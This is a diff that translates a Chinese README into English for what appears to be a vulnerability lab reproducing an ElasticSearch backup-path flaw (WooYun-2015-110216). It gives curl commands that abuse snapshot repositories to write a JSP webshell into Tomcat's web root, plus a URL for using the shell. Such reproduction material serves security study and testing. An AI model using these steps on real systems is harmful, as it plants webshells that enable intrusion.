@@ -1,31 +1,38 @@
-# Elasticsearch写入webshell漏洞（WooYun-2015-110216）
+# ElasticSearch Arbitrary File Upload (WooYun-2015-110216)
 
-参考文章： http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
+[中文版本(Chinese version)](README.zh-cn.md)
 
-## 原理
+ElasticSearch is a distributed, RESTful search and analytics engine.
 
-ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。
+A vulnerability in ElasticSearch's backup functionality allows attackers to write arbitrary files to the filesystem, potentially leading to webshell upload when combined with other web services.
 
-所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。
+ElasticSearch includes a data backup feature that allows users to specify a path where backup data will be stored. Both the path and file names are controllable by the user.
 
-和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项`path.repo`中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。
+If other web services (like Tomcat, PHP, etc.) are running on the same system, an attacker can exploit ElasticSearch's backup functionality to write a webshell to a web-accessible directory.
 
-## 测试环境
+Similar to [CVE-2015-5531](../CVE-2015-5531/), this vulnerability is related to the backup repository functionality. In ElasticSearch versions after 1.5.1, the root path of backup repositories is restricted to the `path.repo` configuration option. If administrators don't configure this option, the backup functionality is disabled by default. Even if configured, writing a webshell is only possible if the web root is within the configured directory.
 
-编译与启动测试环境：
+References:
+
+- <http://cb.drops.wiki/bugs/wooyun-2015-0110216.html>
+
+## Environment Setup
+
+Execute the following commands to start a ElasticSearch server 1.5.1, and a Tomcat server is running on the same container:
 
 ```
-docker compose build
 docker compose up -d
 ```
 
-简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在`/usr/local/tomcat`，web目录是`/usr/local/tomcat/webapps`；ElasticSearch目录在`/usr/share/elasticsearch`。
+After the environment starts, you can access the ElasticSearch server at `http://your-ip:9200`, and the Tomcat server at `http://your-ip:8080`.
 
-我们的目标就是利用ElasticSearch，在`/usr/local/tomcat/webapps`目录下写入我们的webshell。
+Tomcat is installed in `/usr/local/tomcat` with its web directory at `/usr/local/tomcat/webapps`. ElasticSearch is installed in `/usr/share/elasticsearch`.
 
-## 测试流程
+## Vulnerability Reproduction
 
-首先创建一个恶意索引文档：
+Our goal is to use ElasticSearch to write a webshell into `/usr/local/tomcat/webapps`.
+
+First, create a malicious index document:
 
 ```
 curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
@@ -33,9 +40,9 @@ curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
 '
 ```
 
-再创建一个恶意的存储库，其中`location`的值即为我要写入的路径。
+Then create a malicious repository. The `location` value is the path where we want to write our file.
 
-> 园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。
+> Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).
 
 ```
 curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{
@@ -47,7 +54,7 @@ curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{
 }'
 ```
 
-存储库验证并创建:
+Verify and create the repository:
 
 ```
 curl -XPUT "http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp" -d '{
@@ -57,10 +64,10 @@ curl -XPUT "http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp" -d '{
 }'
 ```
 
-完成！
+Done!
 
-访问`http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp`，这就是我们写入的webshell。
+Access `http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp` to find our uploaded webshell.
 
-该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：`http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success`，我们再访问/wwwroot/test.jsp就能看到success了：
+This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: `http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success`. Then accessing /wwwroot/test.jsp will show "success":
 
 ![](1.png)
